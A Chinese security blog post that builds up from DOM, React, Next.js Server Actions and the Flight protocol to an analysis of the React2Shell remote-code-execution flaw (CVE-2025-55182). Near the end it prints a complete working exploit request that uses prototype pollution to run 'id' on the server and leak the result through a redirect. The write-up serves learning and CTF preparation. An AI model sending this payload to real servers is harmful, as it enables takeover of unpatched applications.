---
title: 从0开始的React2Shell
description: 尝试深入研究并解析CVE-2025-55182
author: lamaper
date: 2026-02-03 22:10:21 +0800
categories: [Cyber Security]
tags: [web, javascript, RCE, nextjs, react]
math: true
mermaid: true
toc: true
render_with_liquid: true
image:
  path: https://th.bing.com/th/id/OIP.-NItTXnnQVMJTww8ojo_LAHaEV?o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3
---

{% raw %}

自从React2Shell披露以来，网上都是AI写的文章，好不容易找到P牛写的解析，发现太深奥看不太懂，恰好那时候还在备考期末，考完之后国赛、阿里CTF接连而来的基于CVE-2025-55182漏洞的题目不断地提醒我，是时候好好研究一下这个评分10.0的漏洞了。

我们从盘古开天辟地讲起：

## 什么是DOM

> **文档对象模型**（DOM）通过将文档的结构（例如表示网页的 HTML）以对象的形式存储在内存中，将网页与脚本或编程语言连接起来。尽管将 HTML、SVG 或 XML 文档建模为对象并不是 JavaScript 核心语言的一部分，但它通常与 JavaScript 相关。
>
> [【文档对象模型（DOM） - Web API - MDN】](https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model)

DOM 是浏览器为网页自动生成的一个结构图。 当你写下 HTML 标签时，浏览器会把它们转化成内存中的一个 JavaScript 对象模型。你可以通过 JavaScript 去增、删、改这个模型，浏览器会实时把修改反映到屏幕上。

在 JS 中，`document` 对象是整个网页的入口。你要修改某个东西，必须先从 `document` 开始找。例如通过标签的唯一身份证 `id` 来找：

```javascript
let target = document.getElementById('user-name');
```

或者通过 `class` 类名找：

```javascript
let prices = document.getElementsByClassName('price');
```

改内容可以通过`innerText` 或者 `innerHTML`

- **`innerText`**：把所有内容当作字符串解析
- **`innerHTML`**：会把字符串当成 HTML 解析。

```javascript
let box = document.getElementById('box');
box.innerText = "<b>你好</b>"; // 显示：<b>你好</b>
box.innerHTML = "<b>你好</b>"; // 显示：你好（加粗）
```

## 什么是React

> React 的主要目标是最大程度地减少开发人员构建 UI 时发生的错误。它通过使用组件——描述部分用户界面的、自包含的逻辑代码段——来实现此目的。这些组件可以组合在一起以创建完整的 UI，React 将许多渲染工作进行抽象化，使你可以专注于 UI 设计。
>
> [【React 入门 - 学习 Web 开发 - MDN】](https://developer.mozilla.org/zh-CN/docs/Learn_web_development/Core/Frameworks_libraries/React_getting_started)

在早期网页设计中，如果要设计一个简单的计数器，我们会这么写：

```javascript
<div id="display">计数：0</div>
<button id="btn">点击加 1</button>

<script>
  let count = 0;
  const display = document.getElementById('display');
  const btn = document.getElementById('btn');

  btn.addEventListener('click', () => {
    count++; 
    display.innerText = `当前计数：${count}`; // 手动寻找 DOM 并更新
  });
</script>
```

这种写法会让单个DOM元素与脚本绑定，具有很差的绑定性，如果这里的计数器显示不止这一处（比如十个地方都依赖于这个“点击数”），就需要找到这十个不同的DOM元素并依次更新。例如写一个改名的逻辑：

```javascript
// 假设用户把名字从 "lamaper" 改成了 "Admin"
const newName = "Admin";

// 需要手动找到并更新每一个受影响的 HTML 元素
document.getElementById('nav-user-name').innerText = newName;
document.getElementById('sidebar-title').innerText = newName;
document.getElementById('profile-header-name').innerText = newName;
document.getElementById('comment-author-45').innerText = newName;
document.getElementById('cart-summary-user').innerText = newName;
document.getElementById('footer-welcome-msg').innerText = `当前登录：${newName}`;
// ... 
```

这种“寻找并替换”的操作非常容易导致DOM型XSS。开发者为了方便，经常直接用 `.innerHTML = data`，如果 `data` 是用户可控的，就会产生安全风险。

React解决了这个问题，我们不需要找到标签，只需要修改内容即可。

```javascript
function Counter() {
  const [count, setCount] = React.useState(0);
  return (
    <div>
      <p>计数：{count}</p>
      <button onClick={() => setCount(count + 1)}>点击加 1</button>
    </div>
  );
}
```

## 什么是NextJs

Next.js 是一个基于 React 的现代化 Web 应用框架，旨在简化开发流程并提升性能。它提供了许多开箱即用的功能，帮助开发者快速构建高效的 Web 应用。Next.js 支持多种渲染模式，包括 SSR（服务端渲染）、CSR（客户端渲染） 和 静态生成（Static Generation），以满足不同场景的性能需求。它还支持 ISR（增量静态生成），实现动态内容的高效更新。

需要知道的是，React是前端库，Next.js是后端框架。如果单纯依赖React，我们需要后端进行配合。以一个修改用户名的逻辑为例：

```javascript
function ChangeName() {
  const [name, setName] = useState("");
  const saveToBackend = async () => {
    await fetch('https://api.yoursite.com/update-name', {
      method: 'POST',
      body: JSON.stringify({ newName: name })
    });
  };
  return <button onClick={saveToBackend}>保存</button>;
}
```

接下来，需要后端服务去处理这个前端请求。

如果使用Next.js，那么这段逻辑可以这么写：

```javascript
async function updateNameInDB(formData) {
  'use server'; // 这是一个 Server Action
  const newName = formData.get('name');
  console.log("正在服务器操作数据库..."); 
}

export default function ProfilePage() {
  return (
    <form action={updateNameInDB}>
      <input name="name" />
      <button type="submit">点我直接传给后端服务器</button>
    </form>
  );
}
```

这样就做到了前后端融合。

## 什么是RSC

> 简单来说，React Server Components就是一种只在服务器上跑的React组件。在传统的React组件，不管是SSR还是CSR，最终都要在浏览器里被激活（hydrate）。但RSC不一样，它不会出现在浏览器里。服务器渲染完之后，会生成一种特殊的数据格式（叫RSC Payload），然后流式传输给浏览器，浏览器的React再把这些数据"翻译"成真正的DOM。
>
> [从零开始理解React Server Components - 知乎](https://zhuanlan.zhihu.com/p/1931475891160085504)

在 RSC 出现之前，React 的逻辑是把所有代码发给浏览器，让浏览器去执行、去请求数据、去生成 HTML，这导致浏览器负担很大，加载慢。RSC 核心就是能让服务器完成的工作就不让浏览器干。

所以 RSC 解决几个痛点：

以前如果你要在网页上显示一个 Markdown 文章，你必须把巨大的 `markdown-parser.js` 库发送给用户的浏览器，让浏览器去解析。而 RSC 让这个解析过程在服务器上运行。服务器直接发给浏览器解析好的 HTML。浏览器根本不需要下载解析库。

以前前端以`组件 A 加载完 -> 发请求拿数据 -> 发现需要渲染组件 B -> 组件 B 加载完 -> 发请求拿数据...`为工作流程，RSC 让组件直接在服务器上运行，可以直接读数据库。数据获取和组件渲染是同时发生的，没有网络延迟的阶梯。、

## 什么是 Server Action

在传统的开发中，前端请求后端通常是通过 `fetch('/api/xxx')` 发送 JSON。 但在 Next.js (RSC) 架构中，为了让前端能直接调用后端的函数，React 搞了一个黑科技叫 **Server Actions**。只要你的代码里出现了 `'use server'`，并且你在前端调用了这个函数，浏览器就会自动把参数打包发送给后端。

在 Server Action 出现之前或是不使用它的场景中，前后端的交互非常界限分明，我们通常称之为 API 模式或前后端分离。

例如一个表单提交逻辑，如果采用 React + Go/PHP...等这种前后端分离模式设计的话，后端代码省略，前端代码可以写为：

```javascript
import { useState } from 'react';

export default function RegisterForm() {
  const [name, setName] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault(); 
    
    const payload = JSON.stringify({ username: name });

    const res = await fetch('/api/saveUser', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: payload
    });

    const result = await res.json();
    alert(result.message);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input value={name} onChange={e => setName(e.target.value)} />
      <button type="submit">提交</button>
    </form>
  );
}
```

如果用Next.js技术，在`action.js`（后端代码）中：

```javascript
'use server';
export async function saveData(formData) {
  // ...
  console.log("Saving...");
}
```

在`page.js`（前端代码）中：

```javascript
import { saveData } from './actions';

export default function Page() {
  return (
    <form action={saveData}>
      <input name="username" />
      <button type="submit">提交</button>
    </form>
  );
}
```

由于后端代码中出现了 `'use server'`，当用户点击提交的时候会触发Server Action，浏览器就会自动向后端发送请求。也就是说，Next.js模糊了前后端的边界，做到无缝开发，这也就是为什么人们会说前端也可以写出后端漏洞了：[So what’s the deal with the code on this? Been seeing this a lot on Twitter today : r/nextjs](https://www.reddit.com/r/nextjs/comments/17hgtrt/so_whats_the_deal_with_the_code_on_this_been/)。

## 什么是 Flight 协议

普通的 JSON (`application/json`) 对于 React 的野心来说，太弱了。React 想要做的事情是在服务器上把组件运行完，然后把运行结果，即一棵包含数据、样式、甚至未完成的异步任务的树，发送给浏览器。

在上文举例的时候，如果不使用Next.js技术栈，我们可以很明显地发现：

```javascript
const res = await fetch('/api/saveUser', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: payload
    });
```

这里 res 采用 application/json 协议，是常见的标准 MIME 协议，产生的请求报文：

```http
POST /api/update-profile HTTP/1.1
Host: example.com
Content-Type: application/json  

{
  "username": "lamaper",
  "avatarConfig": {
    "color": "red"
  }
}
```

但是如果采用Next.js技术栈并启用Server Action，那么前端向后端发送的请求就会采用 Flight 协议，请求报文就是：

```http
POST / HTTP/1.1
Host: example.com
Next-Action: 86b...f2a
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="0"

{"username":"lamaper", "avatarConfig":"$1"}
------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="1"

{"color":"red"}
------WebKitFormBoundaryXYZ--
```

这与传统请求大相径庭，产生的差异点主要有：

- 请求头中新增了`Next-Action`，用来声明这是一个Server Action；
- 请求头`Content-Type`不但写了`multipart/form-data`，还将表单头`boundary=----WebKitFormBoundaryXYZ`也一并写入；
- 表单也不是传统的上下两个头，而是根据有多少个（块，Chunk）数据产生，`Content-Disposition: form-data; name="0"`就是描述，其中`name`的值就代表了这传输的是第几块数据；
- .....

Flight 协议使用 `$` 前缀的字符串 来编码纯 JSON 无法表示的特殊值：

| 前缀      | 类型           | 示例                     | 描述                       |
| --------- | -------------- | ------------------------ | -------------------------- |
| `$$`      | 转义 `$`       | `"$$hello"` → `"$hello"` | 以 `$` 开头的字面量字符串  |
| `$@`      | Promise/Chunk  | `"$@0"`                  | 引用 Chunk ID 0            |
| `$F`      | 服务端引用     | `"$F0"`                  | 服务端函数引用             |
| `$T`      | 临时引用       | `"$T"`                   | 不透明的临时引用           |
| `$Q`      | Map            | `"$Q0"`                  | 位于 Chunk 0 的 Map 对象   |
| `$W`      | Set            | `"$W0"`                  | 位于 Chunk 0 的 Set 对象   |
| `$K`      | FormData       | `"$K0"`                  | 位于 Chunk 0 的 FormData   |
| `$B`      | Blob           | `"$B0"`                  | 位于 Chunk 0 的 Blob       |
| `$n`      | BigInt         | `"$n123"`                | BigInt 值                  |
| `$D`      | Date           | `"$D2024-01-01"`         | Date 对象                  |
| `$N`      | NaN            | `"$N"`                   | NaN 值                     |
| `$I`      | Infinity       | `"$I"`                   | 无穷大                     |
| `$-`      | -Infinity/-0   | `"$-I"` 或 `"$-0"`       | 负无穷或负零               |
| `$u`      | undefined      | `"$u"`                   | undefined 值               |
| `$R`      | ReadableStream | `"$R0"`                  | ReadableStream             |
| `$0-9a-f` | Chunk 引用     | `"$1"`, `"$a"`           | 通过十六进制 ID 引用 Chunk |

## 什么是 Thenable 对象

> 在古早时期的JavaScript中有一个著名的问题叫做“回调地狱”，因为JavaScript设计初就作为一个纯异步的语言，大量的系统API在执行耗时操作时都是支持传入一个回调函数，当操作执行完毕时调用这个回调函数。
>
> [1. Thenable的由来 - phithon - 知识星球](https://t.zsxq.com/738t3)

JavaScript 是单线程的，这意味着它一次只能做一件事。如果要让程序去读取文件或者请求网络，程序不能卡在那里等，否则整个网页就卡死了。传统的解决方案是使用回调函数，具体来说，就是把一个函数 A 当作参数，传给另一个函数 B。当 B 做完某些事情后，去执行 A，这个 A，就叫“回调函数”。为了防止卡死，在 JavaScript/Node.js 中回调函数被强制异步。

例如，我们要获取一个id，传统Node.js写法：

```javascript
get_user(function(user) {
    get_id(user, function(id) {
        get_order(id, function(order) {
            console.log("终于拿到了");
        });
    });
});
```

由于这三个步骤是严格有顺序的，不能乱序执行，所以必须这么写，这也就导致过分嵌套代码，造成代码可读性差。

为了消灭这种缩进，JavaScript 社区引入了 Promise 概念。Promise 是一个**对象**，代表后续才会知道结果的一个值。每个 Promise 对象都被要求有一个`.then()`方法，这就解决了回调地狱：

```javascript
login("user", "pass")
    .then(token => getUserID(token))
    .then(id => getOrders(id))
    .then(orders => console.log(orders));
```

然而，在 Promise 成为 JavaScript 官方标准（ES6） 之前，市面上已经有很多第三方库自己实现了 Promise，比如 jQuery 的 `$.Deferred`，以及 `Bluebird` 库。这就造成了多家 Promise 对象相互不认识的场景，为了保证代码的通用性，JavaScript 制定了一条兼容性规则，即只要一个对象有`then()`方法，就认为是 Promise 对象。而这个对象就是 Thenable 对象。它不一定是真正的官方 Promise，但它有 `then()` 方法，所以我们就把它当真的用 。

后来，JavaScript 引入了 `async/await` 语法，让我们写异步代码像写同步代码一样爽：

```javascript
const token = await login("user");
```

当 `await` 后面跟一个东西时，它会检查这个东西是不是 Thenable，如果是，`await` 就会自动去执行它的 `then` 方法，尝试取出结果。需要注意的是，`await`会盲目执行，也就是说只要对象有`then()`方法就会执行。

## 什么是 Chunk

Chunk 是 React 传输数据的最小单位。类似在线播放流媒体视频分块下载的.ts文件一样。在 HTTP 响应体里，每一个 Chunk 都是一行文本，以换行符分隔，其标准格式是： `[十六进制ID]:[类型标记][数据内容]`，然而 Flight 协议把 Chunk 进行拆分，以上文的请求为例子：

```http
POST / HTTP/1.1
Host: example.com
Next-Action: 86b...f2a
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="0"

{"username":"lamaper", "avatarConfig":"$1"}
------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="1"

{"color":"red"}
------WebKitFormBoundaryXYZ--
```

那么这个请求对应的 Chunk 就是：

```
0:{"username":"lamaper", "avatarConfig":"$1"}
1:{"color":"red"}
```

## 什么是数据流的状态机

当你查看支持 React Server Components 的应用的网络请求时，你会看到类似下面这种流式数据：

```json
1:"$Sreact.suspense"
2:{"status":"resolved_model","value":{"tag":"div","children":"Hello World"}}
```

在流式渲染（Streaming）中，服务器不是一次性把 HTML 发给浏览器，而是分块发送。一个被 `lazy` 加载或从服务器异步获取的组件，在传输过程中会经历几种状态：

- **Pending**: 数据还在路上。
- **Resolved (resolved_model)**: 数据（包括组件结构、Props 等）已成功到达客户端并被解析。
- **Rejected**: 加载或处理过程中出错了。

当客户端收到带有 `resolved_model` 标识的数据块时，React 可以在不等待整个页面下载完的情况下，即时恢复（Restore） 这一部分 UI 的交互能力。

## 漏洞是怎么来的

>在我们学习SQL注入的漏洞的时候，前辈就告诉过我们大部分漏洞的本质——“**混淆数据和业务逻辑**”。SQL注入是用户的输入变成了SQL语句的一部分，命令注入是用户的输入变成了系统命令的一部分，XSS是用户的输入变成了HTML或JavaScript的一部分。
>
>不巧的是，React2Shell这个漏洞实际上也有类似的问题，网上几乎所有文章都没有讲明白这一点。
>
>[React2Shell攻防笔记：原理挖掘与价值15万美元的WAF绕过思路 - 离别歌](https://www.leavesongs.com/PENETRATION/deep-dive-into-react2shell.html)

### Flight 传输 Promise 对象

Flight 协议解决了原本 json 的一个问题：无法传输异步状态，即无法传输 Promise。具体来说：

- JSON 里没有 Promise。但 React 希望服务器告诉浏览器：这个评论区还在读取数据库，你先显示个加载圈，等我读完了再把数据推给你。

- Flight 协议为此设计了特殊标记，如 `$@`，能把一个正在运行的 Promise 传过去，浏览器收到后会自动 `await` 它 。

盲生发现了华点，如果我们恶意构造一个带有`.then()`方法的对象，由于 Thenable 机制，这个对象会被认为是 Promise 对象，那么 Flight 协议就会把这个对象发送，React 就会自动运行这个恶意方法。

### 上下文的混淆

在`/packages/react-client/src/ReactFlightClient.js`中，我们可以看到：

```javascript
function parseModel<T>(response: Response, json: UninitializedModel): T {
  return JSON.parse(json, response._fromJSON);
}

function createFromJSONCallback(response: Response) {
  // $FlowFixMe[missing-this-annot]
  return function (key: string, value: JSONValue) {
    if (typeof value === 'string') {
      // We can't use .bind here because we need the "this" value.
      return parseModelString(response, this, key, value);
    }
    if (typeof value === 'object' && value !== null) {
      return parseModelTuple(response, value);
    }
    return value;
  };
}
```

`parseModel()`是解析流程的启动器。当 React 决定解析一段 JSON 字符串时，都会调这个函数。

`createFromJSONCallback()`把当前的 `response`（上下文）闭包进了这个回调函数里。这意味着，这个解析器从此就和这个 `response` 绑定了。当代码执行 `return parseModelString(response, ...)` 时，这个 `response` 就是传递给后续 `case 'B'` 逻辑的那个带毒的对象。

接下来我们关注这段代码：

```javascript
ReactPromise.prototype = (Object.create(Promise.prototype): any);
// TODO: This doesn't return a new Promise chain unlike the real .then
ReactPromise.prototype.then = function <T>(
  this: SomeChunk<T>,
  resolve: (value: T) => mixed,
  reject?: (reason: mixed) => mixed,
) {
  const chunk: SomeChunk<T> = this;
  // If we have resolved content, we try to initialize it first which
  // might put us back into one of the other states.
  switch (chunk.status) {
    case RESOLVED_MODEL:
      initializeModelChunk(chunk);
      break;
    case RESOLVED_MODULE:
      initializeModuleChunk(chunk);
      break;
  }
```

在这里我们看到一个逻辑，如果我们有已解析的内容，我们会尝试先初始化它，这可能会把我们带回其他状态之一（If we have resolved content, we try to initialize it first which
might put us back into one of the other states.）。所以说在这段代码中，chunk是被认为完全可信的。

我们继续向下关注`initializeModelChunk`函数：

```javascript
function initializeModelChunk<T>(chunk: ResolvedModelChunk<T>): void {
  const prevHandler = initializingHandler;
  const prevChunk = initializingChunk;
  initializingHandler = null;

  const resolvedModel = chunk.value;
  const response = chunk.reason;

  // ...
  
  try {
    const value: T = parseModel(response, resolvedModel);
    // Invoke any listeners added while resolving this model. I.e. cyclic
    // references. This may or may not fully resolve the model depending on
    // if they were blocked.
    const resolveListeners = cyclicChunk.value;
    // ...
}
```

我们发现这个函数直接获取了Chunk的value，并将Chunk的reason作为response，需要注意的是，这里的response并不一定是全局的response，而是Chunk返回的response。再下来，这个从Chunk中取出的response被塞入解析中。

### 错误的解析方式

就像反序列化漏洞、SQL注入漏洞等是信任了不可控输入一样，既然我们发现了 Flight 协议可以构造恶意对象，我们肯定希望去了解 Flight 协议的解析机制，看是否能够利用。在 commit [#34272](https://github.com/facebook/react/blob/06cfa99f3740c4b8c16c8d63d97b0f52d90eec43/) 上我们可以看到漏洞披露前最后一次修改的[代码](https://github.com/facebook/react/blob/06cfa99f3740c4b8c16c8d63d97b0f52d90eec43/packages/react-server/src/ReactFlightReplyServer.js)。

在`packages/react-server/src/ReactFlightReplyServer.js`的`reviewModel()`函数中我们可以看到解析带有`$`标记的逻辑：

```javascript
function reviveModel(
  response: Response,
  parentObj: any,
  parentKey: string,
  value: JSONValue,
  reference: void | string,
): any {
  if (typeof value === 'string') {
    // We can't use .bind here because we need the "this" value.
    return parseModelString(response, parentObj, parentKey, value, reference);
  }
  if (typeof value === 'object' && value !== null) {
    // [作者注：此处省略] ......
  return value;
}
```

`reviveModel`函数是分Chunk调用的，即每次调用针对的都是一个Chunk，或者说，Chunk是按行读取处理的。

在接下来的`parseModelString()`函数中：

```javascript
function parseModelString(
  response: Response,
  obj: Object,
  key: string,
  value: string,
  reference: void | string,
): any {
  if (value[0] === '$') {
    switch (value[1]) {
      ...
      case 'B': {
        // Blob
        const id = parseInt(value.slice(2), 16);
        const prefix = response._prefix;
        const blobKey = prefix + id;
        // We should have this backingEntry in the store already because we emitted
        // it before referencing it. It should be a Blob.
        const backingEntry: Blob = (response._formData.get(blobKey): any);
        return backingEntry;
      }
    }
   ...
    // We assume that anything else is a reference ID.
    const ref = value.slice(1);
    return getOutlinedModel(response, ref, obj, key, createModel);
  }
  return value;
}
```

我们彻底发现了漏洞，React 的开发者犯了一个经典的错误，认为 `response` 的属性是可信的。然而我们都知道，JavaScript一直存在原型链污染这个安全问题，这里的 `response` 明显不可信，如果一个攻击者发送一个含有`__proto__`的 json 构造一个恶意对象。

但是从代码上来看，`prifix`始终是一个字符串对象，无法被执行，所以我们要接着往下看，`blobKey`拼接了`prifix`，接下来`const backingEntry: Blob = (response._formData.get(blobKey): any);`把`blobKey`塞到`_formData`中。我们可以发现，这个`_formData`是`response`的属性。

这下思路明朗了，我们可以控制这个`_formData`，修改其`get()`方法引用将其指向一个可以执行恶意代码的函数上去。

回过头来看这个漏洞的Payload：

```http
POST / HTTP/1.1
Host: localhost
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 758

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then", <-- ① 这是 value，也是入口
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",  <-- ② 这是 _prefix 的源头
    "_chunks": "$Q2",
    "_formData": {      <-- ③ 这是 _formData 的源头 
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

`name="0"` 的这个 JSON 对象，它其实是在伪装一个 React 内部的 Chunk 对象。

- `"status": "resolved_model" `用来欺骗React。让React认为这是一个懒处理对象.
- `"value": "{\"then\":\"$B1337\"}"`这是一个json对象，React会再对其进行解析。重点来了，这里解析出来的then还是一个blob，所以又会再调用一次上述的 parseModelString ，而此时，由于懒处理机制，调用parseModelString时候的response会被直接从请求中提取，而这个response就是下文的_response。 
- `"_response"`是一个自行定义的对象，当 React 解析上面的 "value" 时，由于逻辑漏洞，它错误地使用了这个“局部变量”作为全局 Context。在这里我们污染`_prefix`和`_formData`。
- 将`_formData`的`get()`方法劫持为一个构造函数的构造函数，这样就可以通过json构造对象，而`_prefix`就是我们恶意构造的对象。上层的`value`保证我们能够在`parseModelString()`的`case 'B'`中停留。

`name="1"`这个Chunk使用Flight协议语法，通过`$@0`调用`name="0"`的这个含有`.then()`的对象，这个对象被解析为Promise对象（Thenable机制），顺理成章的执行`.then()`，这里的`.then()` 实际上不仅仅是一个普通的属性，它已经被前面的解析过程“偷梁换柱”，变成了一个由 Function 构造器生成的恶意函数，其函数体就是 _prefix 里的代码。由于 React 的机制是遇到 Thenable 对象就会自动执行其 `.then() `方法以获取结果，这一执行，就相当于直接在服务器端运行了恶意代码，从而完成了 RCE。

这里需要额外注意的是payload的：

```json
"_prefix": "var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
```

你会发现这里的尾部带有一个分号，这个分号可不是乱加的。`const blobKey = prefix + id;`是合并字符串操作，这里最后会成为：

```javascript
function anonymous() {
    var res = process
    .mainModule.require('child_process')
    .execSync('id').toString().trim();
    ;
    throw Object.assign(new Error('NEXT_REDIRECT'),
      {digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});
    1337
}
```

这里的分号就是用来分开`1337`的。至于这个1337纯属是payload构造者的小巧思，没有什么特殊含义。

这个payload前半部分沙箱逃逸用来执行命令，后半部分throw来外带结果：

- `new Error('NEXT_REDIRECT')`: 创建一个普通的错误对象。

- `Object.assign(..., { digest: ... })`: Next.js 判断一个错误是错误对象上有没有一个特定的属性叫做 `digest`。

```javascript
`NEXT_REDIRECT;push;/login?a=${res};307;`
```

这其实是 Next.js 内部定义的一种通信协议格式。Next.js 捕获到错误后，会解析 `digest` 字符串，格式大致是： `[信号类型];[跳转模式];[目标URL];[HTTP状态码];`

- `NEXT_REDIRECT`: 告诉框架要跳转。
- `push`: 告诉前端路由，用 `router.push` 模式跳转。
- `/login?a=${res}` (最骚的地方):
  - =把用户跳转到 `/login` 页面。
  - 但是在 URL 后面加了个查询参数 `?a=`。
  - 把命令执行结果拼接到这里。
- `307`: 告诉浏览器这是一个临时重定向。

至此大功告成。



## 参考文章与推荐阅读

[深入探究 React 史上最大安全漏洞ReactServer Actions RCE 漏洞分析:本文档深入分析了 Rea - 掘金](https://juejin.cn/post/7579892222609293347)

[React2Shell攻防笔记：原理挖掘与价值15万美元的WAF绕过思路 - 离别歌](https://www.leavesongs.com/PENETRATION/deep-dive-into-react2shell.html)

{% endraw %}